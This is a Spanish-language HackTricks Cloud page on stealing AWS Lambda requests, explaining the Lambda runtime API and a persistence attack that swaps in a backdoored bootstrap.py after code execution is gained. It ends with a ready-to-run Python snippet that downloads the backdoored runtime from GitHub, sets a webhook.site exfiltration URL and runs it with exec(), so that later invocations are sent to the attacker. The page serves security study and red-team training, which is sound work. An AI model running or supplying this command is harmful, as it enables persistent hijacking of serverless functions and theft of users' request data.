# AWS - Robar Solicitudes de Lambda

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Flujo de Lambda

<figure><img src="../../../../.gitbook/assets/image (152).png" alt=""><figcaption><p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/lambda_poc_2_arch.png">https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/lambda_poc_2_arch.png</a></p></figcaption></figure>

1. **Slicer** es un proceso fuera del contenedor que **env√≠a** **invocaciones** al proceso **init**.
2. El proceso init escucha en el puerto **9001** exponiendo algunos endpoints interesantes:
* **`/2018-06-01/runtime/invocation/next`** ‚Äì obtener el siguiente evento de invocaci√≥n
* **`/2018-06-01/runtime/invocation/{invoke-id}/response`** ‚Äì devolver la respuesta del handler para la invocaci√≥n
* **`/2018-06-01/runtime/invocation/{invoke-id}/error`** ‚Äì devolver un error de ejecuci√≥n
3. **bootstrap.py** tiene un bucle que obtiene invocaciones del proceso init y llama al c√≥digo del usuario para manejarlas (**`/next`**).
4. Finalmente, **bootstrap.py** env√≠a al init la **respuesta**

Ten en cuenta que bootstrap carga el c√≥digo del usuario como un m√≥dulo, por lo que cualquier ejecuci√≥n de c√≥digo realizada por el c√≥digo del usuario en realidad est√° ocurriendo en este proceso.

## Robar Solicitudes de Lambda

El objetivo de este ataque es hacer que el c√≥digo del usuario ejecute un proceso **`bootstrap.py`** malicioso dentro del proceso **`bootstrap.py`** que maneja la solicitud vulnerable. De esta manera, el proceso **bootstrap malicioso** comenzar√° a **hablar con el proceso init** para manejar las solicitudes mientras que el bootstrap **leg√≠timo** est√° **atrapado** ejecutando el malicioso, por lo que no pedir√° solicitudes al proceso init.&#x20;

Esta es una tarea simple de lograr ya que el c√≥digo del usuario est√° siendo ejecutado por el proceso **`bootstrap.py`** leg√≠timo. As√≠ que el atacante podr√≠a:

* **Enviar un resultado falso de la invocaci√≥n actual al proceso init**, para que init piense que el proceso bootstrap est√° esperando m√°s invocaciones.
* Se debe enviar una solicitud a **`/${invoke-id}/response`**&#x20;
* El invoke-id se puede obtener del stack del proceso **`bootstrap.py`** leg√≠timo usando el m√≥dulo de python [**inspect**](https://docs.python.org/3/library/inspect.html) (como [se propone aqu√≠](https://github.com/twistlock/lambda-persistency-poc/blob/master/poc/switch\_runtime.py)) o simplemente solicit√°ndolo nuevamente a **`/2018-06-01/runtime/invocation/next`** (como [se propone aqu√≠](https://github.com/Djkusik/serverless\_persistency\_poc/blob/master/gcp/exploit\_files/switcher.py)).
* Ejecutar un **`boostrap.py`** malicioso que manejar√° las siguientes invocaciones
* Por razones de sigilo, es posible enviar los par√°metros de invocaci√≥n de lambda a un C2 controlado por el atacante y luego manejar las solicitudes como de costumbre.
* Para este ataque, es suficiente obtener el c√≥digo original de **`bootstrap.py`** del sistema o de [**github**](https://github.com/aws/aws-lambda-python-runtime-interface-client/blob/main/awslambdaric/bootstrap.py), agregar el c√≥digo malicioso y ejecutarlo desde la invocaci√≥n actual de lambda.

### Pasos del Ataque

1. Encontrar una vulnerabilidad de **RCE**.
2. Generar un **bootstrap** **malicioso** (por ejemplo, [https://raw.githubusercontent.com/carlospolop/lambda\_bootstrap\_switcher/main/backdoored\_bootstrap.py](https://raw.githubusercontent.com/carlospolop/lambda\_bootstrap\_switcher/main/backdoored\_bootstrap.py))
3. **Ejecutar** el bootstrap malicioso.

Puedes realizar estas acciones f√°cilmente ejecutando:
```bash
python3 <<EOF
import os
import urllib3

# Download backdoored bootstrap
http = urllib3.PoolManager()
backdoored_bootstrap_url = "https://raw.githubusercontent.com/carlospolop/lambda_bootstrap_switcher/main/backdoored_bootstrap.py"
new_runtime = http.request('GET', backdoored_bootstrap_url).data

# Load new bootstrap
os.environ['URL_EXFIL'] = "https://webhook.site/c7036f43-ce42-442f-99a6-8ab21402a7c0"

exec(new_runtime)
EOF
```
Para m√°s informaci√≥n, consulta [https://github.com/carlospolop/lambda\_bootstrap\_switcher](https://github.com/carlospolop/lambda\_bootstrap\_switcher)

## Referencias

* [https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/](https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/)

{% hint style="success" %}
Aprende y practica AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya HackTricks</summary>

* Consulta los [**planes de suscripci√≥n**](https://github.com/sponsors/carlospolop)!
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
